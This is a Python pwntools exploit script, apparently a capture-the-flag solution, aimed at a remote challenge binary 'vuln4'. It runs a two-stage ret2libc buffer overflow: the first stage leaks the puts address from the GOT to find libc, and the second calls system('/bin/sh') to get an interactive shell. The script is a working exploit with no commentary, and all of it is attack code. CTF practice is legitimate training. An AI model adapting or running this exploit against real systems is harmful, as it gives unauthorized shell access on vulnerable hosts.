from pwn import *


#r=process("./vuln4")
libc=ELF("libc.so.6")
binary=ELF("vuln4")
#raw_input("? %d" %r.pid)

r=remote('ctf.sharif.edu', 4801)
main=0x080484ea 
r.recvuntil("You should find puts yourself\n")

payload="A"*22
payload+=p32(binary.plt['puts'])
payload+=p32(main)
payload+=p32(binary.got['puts'])
r.sendline(payload)

puts = r.recv(4)
puts_addr=u32(puts)
print "stack: ",hex(puts_addr)

libc_base = puts_addr - libc.symbols['puts']
system_addr = libc_base + libc.symbols['system']
bin_sh_addr = libc_base + libc.search('/bin/sh').next()



payload = "A"*22
payload += p32(system_addr)
payload += "JUNK"
payload += p32(bin_sh_addr)

r.sendline(payload)

r.interactive()
